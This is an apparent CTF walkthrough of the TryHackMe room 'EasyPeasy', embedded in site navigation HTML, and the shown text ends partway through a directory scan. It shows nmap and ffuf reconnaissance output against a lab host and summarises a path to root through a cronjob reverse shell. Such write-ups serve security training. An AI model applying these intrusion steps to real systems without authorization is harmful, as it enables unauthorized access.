+      <a href="../../../../htb/easy/nibbles/nibbles/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nibbles
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Vulnhub
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Vulnhub
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
+        
+          <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../vulnhub/easy/jangow/jangow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Jangow
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" checked>
+        
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_1" checked>
+        
+          <label class="md-nav__link" for="__nav_4_3_1" id="__nav_4_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    EasyPeasy
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    EasyPeasy
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    Overview
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information-gathering" class="md-nav__link">
+    Information Gathering
+  </a>
+  
+    <nav class="md-nav" aria-label="Information Gathering">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ffuf" class="md-nav__link">
+    ffuf
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-walking" class="md-nav__link">
+    Web Walking
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Walking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-80" class="md-nav__link">
+    Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-65524" class="md-nav__link">
+    Port 65524
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indexhtml-in-folder-n0th1ng3ls3m4tt3r" class="md-nav__link">
+    index.html in folder /n0th1ng3ls3m4tt3r
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webserver-nginx-on-port-80" class="md-nav__link">
+    Webserver nginx on port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#webserver-apache-on-port-65524" class="md-nav__link">
+    Webserver apache on port 65524
+  </a>
+  
+    <nav class="md-nav" aria-label="Webserver apache on port 65524">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#robotstxt-in-root-folder" class="md-nav__link">
+    robots.txt in root folder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag-in-indexhtml-in-root-folder" class="md-nav__link">
+    flag in index.html in root folder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-in-indexhtml-in-folder-n0th1ng3ls3m4tt3r" class="md-nav__link">
+    string in index.html in folder /n0th1ng3ls3m4tt3r
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../tools/tmux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    tmux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../tools/ffuf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ffuf
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../cheatsheets/cheatsheet_basic_linux_tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Linux Tools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../cheatsheets/cheatsheet_basic_pentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../cheatsheets/cheatsheet_curl/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    curl
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../cheatsheets/cheatsheet_nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    Overview
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information-gathering" class="md-nav__link">
+    Information Gathering
+  </a>
+  
+    <nav class="md-nav" aria-label="Information Gathering">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ffuf" class="md-nav__link">
+    ffuf
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-walking" class="md-nav__link">
+    Web Walking
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Walking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-80" class="md-nav__link">
+    Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-65524" class="md-nav__link">
+    Port 65524
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indexhtml-in-folder-n0th1ng3ls3m4tt3r" class="md-nav__link">
+    index.html in folder /n0th1ng3ls3m4tt3r
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webserver-nginx-on-port-80" class="md-nav__link">
+    Webserver nginx on port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#webserver-apache-on-port-65524" class="md-nav__link">
+    Webserver apache on port 65524
+  </a>
+  
+    <nav class="md-nav" aria-label="Webserver apache on port 65524">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#robotstxt-in-root-folder" class="md-nav__link">
+    robots.txt in root folder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag-in-indexhtml-in-root-folder" class="md-nav__link">
+    flag in index.html in root folder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-in-indexhtml-in-folder-n0th1ng3ls3m4tt3r" class="md-nav__link">
+    string in index.html in folder /n0th1ng3ls3m4tt3r
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                 
+                  
+
+
+  <h1>EasyPeasy</h1>
+
+<div class="admonition danger">
+<p class="admonition-title">Important Notice</p>
+<p>To keep it spoiler-free, all important information to solve the ctf     is either pixelated or encoded with ROT-13. </p>
+</div>
+<h2 id="overview">Overview</h2>
+<p>The room starts with a rather easy nmap and directory enumeration. I've chosen <code>ffuf</code> instead of <code>gobuster</code> because <code>ffuf</code> has the ability to check all subfolders, up to a defined depth, automatically. There are a nginx server on a standard port <code>80</code> and another apache webserver on a non-standard port, as well as an ssh server on a non-standard port. After identifying all the folders on both web servers, all the <code>robots.txt</code>and and <code>index.html</code> files are checked, source included and some encoded strings are found. One of the string is a sha256-like hash but it's not really <code>sha256</code>. After finding the correct cryptographic function it reveals a secret folder. In the secret folder a picture inside a picture is found and with some <code>steganography tools</code> and a password we cracked earlier, an username and a binary representation of a string is found. Converting the binary string we get the password and we can log in via ssh as that user. We get the user flag and with the hint we convert the <code>rotated</code> string to the correct flag. Using <code>linpeas.sh</code> we find a cronjob running as root. Editing the file the cronjob runs and adding a reverse shell, we get <code>root</code> and finally the root flag. </p>
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="nmap">nmap</h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Quick open port scan</label><label for="__tabbed_1_2">Extensive Version And Script Scan On Selected Ports</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.10.24.106
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-11-30<span class="w"> </span><span class="m">19</span>:11<span class="w"> </span>CET
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.24.106
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.053s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65532</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE
+<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http
+<span class="m">6498</span>/tcp<span class="w">  </span>open<span class="w">  </span>unknown
+<span class="m">65524</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+</code></pre></div></td></tr></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.24.106<span class="w"> </span>-p80,6498,65524
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-11-30<span class="w"> </span><span class="m">19</span>:14<span class="w"> </span>CET
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.24.106
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.044s<span class="w"> </span>latency<span class="o">)</span>.
+
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="hll"><span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.16.1
+</span><span class="p">|</span>_http-title:<span class="w"> </span>Welcome<span class="w"> </span>to<span class="w"> </span>nginx!
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry
+<span class="p">|</span>_/
+<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.16.1
+<span class="hll"><span class="m">6498</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+</span><span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">30</span>:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="hll"><span class="m">65524</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.43<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.43<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry
+<span class="p">|</span>_/
+<span class="p">|</span>_http-title:<span class="w"> </span>Apache2<span class="w"> </span>Debian<span class="w"> </span>Default<span class="w"> </span>Page:<span class="w"> </span>It<span class="w"> </span>works
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">13</span>.74<span class="w"> </span>seconds
+</code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+<h3 id="ffuf">ffuf</h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">Port 80</label><label for="__tabbed_2_2">Port 65524</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span>
+<span class="normal">73</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://10.10.24.106/FUZZ<span class="w"> </span>-w<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<span class="w"> </span>-recursion<span class="w"> </span>-recursion-depth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-c<span class="w"> </span>-fc<span class="w"> </span><span class="m">403</span><span class="w"> </span>-v<span class="w"> </span>-e<span class="w"> </span>.txt,.html<span class="w"> </span>-o<span class="w"> </span>enumeration/port80
+
+<span class="w">        </span>/<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">&#39;</span>___<span class="se">\</span>
+<span class="w">    </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/
+<span class="w">    </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
+<span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+<span class="w">        </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\</span>
+<span class="w">        </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/
+
+<span class="w">    </span>v1.3.1<span class="w"> </span>Kali<span class="w"> </span>Exclusive<span class="w"> </span>&lt;<span class="m">3</span>
+________________________________________________
+
+::<span class="w"> </span>Method<span class="w">           </span>:<span class="w"> </span>GET
+::<span class="w"> </span>URL<span class="w">              </span>:<span class="w"> </span>http://10.10.24.106/FUZZ
+::<span class="w"> </span>Wordlist<span class="w">         </span>:<span class="w"> </span>FUZZ:<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+::<span class="w"> </span>Extensions<span class="w">       </span>:<span class="w"> </span>.txt<span class="w"> </span>.html
+::<span class="w"> </span>Output<span class="w"> </span>file<span class="w">      </span>:<span class="w"> </span>enumeration/port80
+::<span class="w"> </span>File<span class="w"> </span>format<span class="w">      </span>:<span class="w"> </span>json
+::<span class="w"> </span>Follow<span class="w"> </span>redirects<span class="w"> </span>:<span class="w"> </span><span class="nb">false</span>
+::<span class="w"> </span>Calibration<span class="w">      </span>:<span class="w"> </span><span class="nb">false</span>
+::<span class="w"> </span>Timeout<span class="w">          </span>:<span class="w"> </span><span class="m">10</span>
+::<span class="w"> </span>Threads<span class="w">          </span>:<span class="w"> </span><span class="m">40</span>
+::<span class="w"> </span>Matcher<span class="w">          </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>,204,301,302,307,401,403,405
+::<span class="w"> </span>Filter<span class="w">           </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">403</span>
+________________________________________________
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">612</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">79</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">26</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/index.html
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>index.html
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">169</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">8</span><span class="o">]</span>
+<span class="hll"><span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden
+</span><span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>hidden
+
+<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://10.10.24.106/hidden/FUZZ
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">43</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">4</span><span class="o">]</span>
+<span class="hll"><span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/robots.txt
+</span><span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>robots.txt
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">612</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">79</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">26</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:
+
